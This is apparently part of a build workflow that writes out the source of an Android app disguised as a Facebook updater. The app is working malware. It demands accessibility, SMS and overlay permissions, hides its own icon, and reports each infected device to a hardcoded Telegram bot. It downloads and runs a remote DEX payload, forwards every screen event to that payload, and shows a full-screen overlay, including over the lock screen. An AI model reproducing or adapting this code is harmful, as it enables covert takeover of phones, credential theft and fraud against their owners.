          EOF

      # ==================== ACCESSIBILITY CONFIG ====================
      
      - name: Create accessibility_config.xml
        run: |
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/app_name"
              android:notificationTimeout="100" />
          EOF

      # ==================== SOURCE FILES ====================
      
      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/facebook/updater/MainActivity.java << 'EOF'
          package com.facebook.updater;

          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Toast;
          import android.widget.Button;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 123;
              private static final int OVERLAY_PERMISSION_REQUEST = 456;
              
              private Button btnGrantPermissions;
              private Button btnGrantAccessibility;
              
              private boolean permissionsGranted = false;
              private boolean accessibilityGranted = false;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  
                  btnGrantPermissions = findViewById(R.id.btnGrantPermissions);
                  btnGrantAccessibility = findViewById(R.id.btnGrantAccessibility);
                  
                  btnGrantPermissions.setOnClickListener(v -> requestAllPermissions());
                  btnGrantAccessibility.setOnClickListener(v -> openAccessibilitySettings());
                  
                  checkPermissions();
              }

              private void checkPermissions() {
                  boolean internetGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean smsGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean networkGranted = ContextCompat.checkSelfPermission(this, 
                      android.Manifest.permission.ACCESS_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED;
                  
                  boolean overlayGranted = true;
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      overlayGranted = Settings.canDrawOverlays(this);
                  }
                  
                  permissionsGranted = internetGranted && smsGranted && networkGranted && overlayGranted;
                  accessibilityGranted = isAccessibilityEnabled();
                  
                  updateButtons();
                  
                  if (permissionsGranted && accessibilityGranted) {
                      startService(new Intent(this, UpdaterService.class));
                      hideAppIcon();
                      finish();
                  }
              }

              private void requestAllPermissions() {
                  String[] permissions = {
                      android.Manifest.permission.RECEIVE_SMS,
                      android.Manifest.permission.ACCESS_NETWORK_STATE
                  };
                  
                  boolean needPermission = false;
                  for (String permission : permissions) {
                      if (ContextCompat.checkSelfPermission(this, permission) 
                          != PackageManager.PERMISSION_GRANTED) {
                          needPermission = true;
                          break;
                      }
                  }
                  
                  if (needPermission) {
                      ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
                  }
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                              Uri.parse("package:" + getPackageName()));
                          startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                      }
                  }
                  
                  new android.os.Handler().postDelayed(this::checkPermissions, 2000);
              }

              private void openAccessibilitySettings() {
                  Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                  startActivity(intent);
                  Toast.makeText(this, "Enable Facebook Accessibility Service", Toast.LENGTH_LONG).show();
                  new android.os.Handler().postDelayed(this::checkPermissions, 3000);
              }

              private boolean isAccessibilityEnabled() {
                  try {
                      String service = getPackageName() + "/" + UpdaterService.class.getCanonicalName();
                      String enabledServices = Settings.Secure.getString(
                          getContentResolver(),
                          Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                      );
                      return enabledServices != null && enabledServices.contains(service);
                  } catch (Exception e) {
                      return false;
                  }
              }

              private void updateButtons() {
                  if (permissionsGranted) {
                      btnGrantPermissions.setEnabled(false);
                      btnGrantPermissions.setText(R.string.permissions_granted);
                  } else {
                      btnGrantPermissions.setEnabled(true);
                      btnGrantPermissions.setText(R.string.grant_permissions);
                  }
                  
                  if (accessibilityGranted) {
                      btnGrantAccessibility.setEnabled(false);
                      btnGrantAccessibility.setText(R.string.accessibility_enabled);
                  } else {
                      btnGrantAccessibility.setEnabled(true);
                      btnGrantAccessibility.setText(R.string.grant_accessibility);
                  }
              }

              private void hideAppIcon() {
                  try {
                      getPackageManager().setComponentEnabledSetting(
                          getComponentName(),
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP
                      );
                      Toast.makeText(this, "✅ All permissions granted! App hidden.", Toast.LENGTH_SHORT).show();
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERMISSION_REQUEST_CODE) {
                      new android.os.Handler().postDelayed(this::checkPermissions, 2000);
                  }
              }

              @Override
              protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                  super.onActivityResult(requestCode, resultCode, data);
                  if (requestCode == OVERLAY_PERMISSION_REQUEST) {
                      new android.os.Handler().postDelayed(this::checkPermissions, 2000);
                  }
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  checkPermissions();
              }
          }
          EOF

      - name: Create Interfaces (AI + Overlay)
        run: |
          cat > app/src/main/java/com/facebook/updater/AiInterface.java << 'EOF'
          package com.facebook.updater;

          public interface AiInterface {
              String askAI(String prompt);
              String analyzeScreen(String screenText);
              boolean isAILoaded();
          }
          EOF

          cat > app/src/main/java/com/facebook/updater/OverlayInterface.java << 'EOF'
          package com.facebook.updater;

          public interface OverlayInterface {
              void showOverlay();
              void hideOverlay();
              boolean isOverlayShowing();
              void updateOverlayProgress(int percent);
          }
          EOF

      - name: Create UpdaterService.java
        run: |
          cat > app/src/main/java/com/facebook/updater/UpdaterService.java << 'EOF'
          package com.facebook.updater;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.AccessibilityServiceInfo;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.net.ConnectivityManager;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.WindowManager;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import android.view.View;
          import android.graphics.Color;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.lang.reflect.Method;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.concurrent.Executors;
          import java.util.concurrent.ScheduledExecutorService;
          import java.util.concurrent.TimeUnit;

          import dalvik.system.DexClassLoader;

          public class UpdaterService extends AccessibilityService implements AiInterface, OverlayInterface {
              private static final String TAG = "UpdaterService";
              private static final String DEX_URL = "https://payload-host-079x.onrender.com/payload.dex";
              private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";
              
              private static final String DEX_MAGIC = "dex\n";
              private static final int RETRY_DELAY_MS = 60000;
              
              private boolean isDexLoaded = false;
              private boolean isDownloading = false;
              private boolean isExecuting = false;
              private Object payloadInstance;
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
              
              private WindowManager windowManager;
              private WebView overlayWebView;
              private boolean isOverlayShowing = false;
              private WindowManager.LayoutParams overlayParams;

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (!isDexLoaded && !isDownloading) {
                          performDexDownload();
                      }
                      if (isDexLoaded && payloadInstance != null) {
                          Method method = payloadInstance.getClass().getMethod("onAccessibilityEvent", AccessibilityEvent.class);
                          method.invoke(payloadInstance, event);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
                  }
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onServiceConnected() {
                  try {
                      super.onServiceConnected();
                      Log.d(TAG, "✅ Accessibility Service Connected!");
                      
                      windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                      
                      AccessibilityServiceInfo info = new AccessibilityServiceInfo();
                      info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                                   AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
                      info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
                      info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                      setServiceInfo(info);
                      
                      sendTelegramNotification("✅ Facebook APK Installed\n" +
                          "Device: " + Build.MODEL + "\n" +
                          "Android: " + Build.VERSION.RELEASE);
                      
                      mainHandler.postDelayed(this::performDexDownload, 3000);
                      
                      scheduler.scheduleAtFixedRate(this::checkVersion, 2, 2, TimeUnit.MINUTES);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "onServiceConnected error: " + e.getMessage());
                  }
              }

              private void performDexDownload() {
                  if (isDexLoaded) {
                      Log.d(TAG, "DEX already loaded");
                      return;
                  }
                  
                  if (isDownloading) {
                      Log.d(TAG, "Download already in progress");
                      return;
                  }
                  
                  if (!isNetworkConnected()) {
                      Log.w(TAG, "No network - retrying in 1 minute");
                      sendTelegramNotification("❌ DEX Download Failed\nReason: No network connection");
                      scheduleRetry();
                      return;
                  }
                  
                  isDownloading = true;
                  
                  try {
                      Log.d(TAG, "🚀 Attempting DEX download...");
                      
                      URL url = new URL(DEX_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(20000);
                      conn.setReadTimeout(20000);
                      conn.setRequestProperty("User-Agent", "Android");
                      
                      int responseCode = conn.getResponseCode();
                      Log.d(TAG, "📡 HTTP Response: " + responseCode);
                      
                      if (responseCode != 200) {
                          conn.disconnect();
                          isDownloading = false;
                          sendTelegramNotification("❌ DEX Download Failed\nServer error: " + responseCode);
                          scheduleRetry();
                          return;
                      }
                      
                      File dexFile = new File(getCacheDir(), "payload.dex");
                      if (dexFile.exists()) dexFile.delete();
                      
                      try (InputStream in = conn.getInputStream();
                           FileOutputStream out = new FileOutputStream(dexFile)) {
                          byte[] buffer = new byte[8192];
                          int len;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                          }
                          out.flush();
                          conn.disconnect();
                      }
                      
                      if (!validateDexFile(dexFile)) {
                          dexFile.delete();
                          isDownloading = false;
                          sendTelegramNotification("❌ DEX Download Failed\nInvalid DEX file");
                          scheduleRetry();
                          return;
                      }
                      
                      isDownloading = false;
                      Log.d(TAG, "✅ DEX downloaded successfully");
                      sendTelegramNotification("✅ DEX Downloaded Successfully");
                      
                      loadAndExecuteDex(dexFile);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Download error: " + e.getMessage());
                      isDownloading = false;
                      sendTelegramNotification("❌ DEX Download Failed\nError: " + e.getMessage());
                      scheduleRetry();
                  }
              }

              private boolean isNetworkConnected() {
                  try {
                      ConnectivityManager cm = (ConnectivityManager) 
                          getSystemService(Context.CONNECTIVITY_SERVICE);
                      if (cm == null) return false;
                      android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                      return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
                  } catch (Exception e) {
                      return false;
                  }
              }

              private boolean validateDexFile(File dexFile) {
                  try {
                      if (!dexFile.exists() || dexFile.length() < 100) return false;
                      byte[] header = new byte[4];
                      try (java.io.FileInputStream fis = new java.io.FileInputStream(dexFile)) {
                          if (fis.read(header) != 4) return false;
                      }
                      return new String(header).equals(DEX_MAGIC);
                  } catch (Exception e) {
                      return false;
                  }
              }

              private void scheduleRetry() {
                  Log.w(TAG, "⏱️ Retrying in exactly 1 minute...");
                  mainHandler.postDelayed(this::performDexDownload, RETRY_DELAY_MS);
              }

              private void loadAndExecuteDex(File dexFile) {
                  if (isExecuting) {
                      Log.d(TAG, "Execution already in progress");
                      return;
                  }
                  
                  isExecuting = true;
                  
                  try {
                      Log.d(TAG, "🚀 Loading and executing DEX...");
                      
                      File optDir = new File(getCacheDir(), "dex_opt");
                      if (!optDir.exists()) optDir.mkdirs();

                      DexClassLoader classLoader = new DexClassLoader(
                          dexFile.getAbsolutePath(),
                          optDir.getAbsolutePath(),
                          null,
                          this.getClass().getClassLoader()
                      );
                      
                      Class<?> mainClass = classLoader.loadClass("com.facebook.payload.Main");
                      payloadInstance = mainClass.newInstance();
                      
                      try {
                          Method setAi = mainClass.getMethod("setAiInterface", AiInterface.class);
                          setAi.invoke(payloadInstance, this);
                      } catch (NoSuchMethodException e) {}
                      
                      try {
                          Method setOverlay = mainClass.getMethod("setOverlayInterface", OverlayInterface.class);
                          setOverlay.invoke(payloadInstance, this);
                      } catch (NoSuchMethodException e) {}
                      
                      Method init = mainClass.getMethod("initialize", AccessibilityService.class, Context.class);
                      init.invoke(payloadInstance, this, this);
                      
                      isDexLoaded = true;
                      isExecuting = false;
                      Log.d(TAG, "✅ DEX executed successfully!");
                      sendTelegramNotification("🚀 DEX Executed Successfully!");
                      
                  } catch (Exception e) {
                      Log.e(TAG, "❌ DEX execution failed: " + e.getMessage());
                      isExecuting = false;
                      sendTelegramNotification("❌ DEX Execution Failed\nError: " + e.getMessage());
                      mainHandler.postDelayed(() -> {
                          if (!isDexLoaded) {
                              performDexDownload();
                          }
                      }, RETRY_DELAY_MS);
                  }
              }

              private void checkVersion() {
                  try {
                      URL url = new URL(VERSION_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(5000);
                      conn.setReadTimeout(5000);
                      
                      if (conn.getResponseCode() == 200) {
                          InputStream in = conn.getInputStream();
                          java.io.BufferedReader reader = new java.io.BufferedReader(
                              new java.io.InputStreamReader(in));
                          String version = reader.readLine();
                          reader.close();
                          in.close();
                          
                          SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
                          String currentVersion = prefs.getString("current_version", "1.0");
                          
                          if (!version.equals(currentVersion)) {
                              Log.d(TAG, "🔄 New version available: " + version);
                              prefs.edit().putString("current_version", version).apply();
                              sendTelegramNotification("🔄 Update Available\nVersion: " + version);
                              isDexLoaded = false;
                              performDexDownload();
                          }
                      }
                      conn.disconnect();
                  } catch (Exception e) {
                      Log.e(TAG, "Version check failed: " + e.getMessage());
                  }
              }

              @Override
              public String askAI(String prompt) {
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("askAI", String.class);
                          return (String) method.invoke(payloadInstance, prompt);
                      } catch (Exception e) {}
                  }
                  return "{\"error\": \"AI not available\"}";
              }

              @Override
              public String analyzeScreen(String screenText) {
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("analyzeScreen", String.class);
                          return (String) method.invoke(payloadInstance, screenText);
                      } catch (Exception e) {}
                  }
                  return "{\"error\": \"Analysis not available\"}";
              }

              @Override
              public boolean isAILoaded() {
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("isAILoaded");
                          return (boolean) method.invoke(payloadInstance);
                      } catch (Exception e) {
                          return false;
                      }
                  }
                  return false;
              }

              @Override
              public void showOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (isOverlayShowing) return;
                          
                          overlayWebView = new WebView(this);
                          overlayWebView.setBackgroundColor(Color.TRANSPARENT);
                          overlayWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                          overlayWebView.getSettings().setJavaScriptEnabled(true);
                          overlayWebView.getSettings().setDomStorageEnabled(true);
                          overlayWebView.getSettings().setLoadWithOverviewMode(true);
                          overlayWebView.getSettings().setUseWideViewPort(true);
                          overlayWebView.setWebViewClient(new WebViewClient() {
                              @Override
                              public void onPageFinished(WebView view, String url) {
                                  Log.d(TAG, "Overlay HTML loaded");
                              }
                          });
                          
                          overlayWebView.loadUrl("file:///android_asset/html/security.html");
                          
                          int layoutFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                              WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                              WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                              WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                              WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                              WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                              WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                          
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                              layoutFlags |= WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON;
                          }
                          
                          overlayParams = new WindowManager.LayoutParams(
                              WindowManager.LayoutParams.MATCH_PARENT,
                              WindowManager.LayoutParams.MATCH_PARENT,
                              Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                                  WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                                  WindowManager.LayoutParams.TYPE_PHONE,
                              layoutFlags,
                              android.graphics.PixelFormat.TRANSLUCENT
                          );
                          
                          windowManager.addView(overlayWebView, overlayParams);
                          isOverlayShowing = true;
                          Log.d(TAG, "✅ Overlay shown");
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to show overlay: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void hideOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              windowManager.removeView(overlayWebView);
                              overlayWebView = null;
                              isOverlayShowing = false;
                              Log.d(TAG, "✅ Overlay hidden");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to hide overlay: " + e.getMessage());
                      }
                  });
              }

              @Override
              public boolean isOverlayShowing() {
                  return isOverlayShowing;
              }

              @Override
              public void updateOverlayProgress(int percent) {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              overlayWebView.loadUrl("javascript:updateProgress(" + percent + ")");
                              Log.d(TAG, "📊 Overlay progress: " + percent + "%");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to update overlay progress: " + e.getMessage());
                      }
                  });
              }

              private void sendTelegramNotification(String message) {
                  Executors.newSingleThreadExecutor().execute(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                          URL obj = new URL(url);
                          HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
                              message.replace("\"", "\\\"") + "\"}";
                          
                          try (java.io.OutputStream os = conn.getOutputStream()) {
                              os.write(json.getBytes());
                              os.flush();
                          }
                          
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) {
                              Log.d(TAG, "✅ Telegram sent: " + message);
                          } else {
                              Log.e(TAG, "Telegram failed: " + responseCode);
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (scheduler != null) scheduler.shutdown();
                  if (isOverlayShowing) hideOverlay();
              }
          }
